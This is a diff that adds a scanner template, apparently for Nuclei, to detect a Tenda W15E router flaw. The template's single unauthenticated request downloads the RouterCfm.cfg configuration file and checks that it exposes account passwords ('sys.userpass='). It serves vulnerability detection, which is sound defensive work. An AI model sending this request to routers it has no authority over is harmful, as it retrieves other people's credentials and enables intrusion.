@@ -1,0 +1,31 @@
+id: tenda-w15e-routercfg-disclosure
+info:
+  name: Tenda W15E Router RouterCfm.cfg Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tenda W15E enterprise routers have a vulnerability allowing attackers to download the RouterCfm.cfg file and obtain sensitive information such as account passwords.
+  reference:
+    - https://mp.weixin.qq.com/s/w-cZU06p5VJb82bs2uoIeg
+  classification:
+    cvss-score: 7.5
+    cve-id: []
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "sys.userpass="
+      - type: word
+        part: header
+        words:
+          - "config/conf"
